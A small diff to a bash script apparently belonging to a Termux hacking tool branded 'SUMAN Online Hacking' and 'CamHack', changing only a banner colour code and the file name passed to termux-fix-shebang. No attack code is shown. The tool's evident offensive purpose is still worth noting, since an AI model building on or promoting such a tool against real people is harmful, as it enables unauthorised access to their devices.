@@ -41,7 +41,7 @@ cwd=`pwd`
 
 # Logo 
 logo="
-printf "\e[1;92m   SUMAN   Online Hacking   \e[0m\n"
+printf "\e[92m   SUMAN   Online Hacking   \e[0m\n"
 printf " \e[36m \n"
 printf "     ██████  ███████ ███    ███        \n"
 printf "     ██      ██   ██ ████  ████        \n"
@@ -152,7 +152,7 @@ trap "echo -e '\n${success}Thanks for using!\n'; exit" 2
 
 # Termux
 if [[ -d /data/data/com.termux/files/home ]]; then
-termux-fix-shebang ch.sh
+termux-fix-shebang CamHack
 termux=true
 else
 termux=false
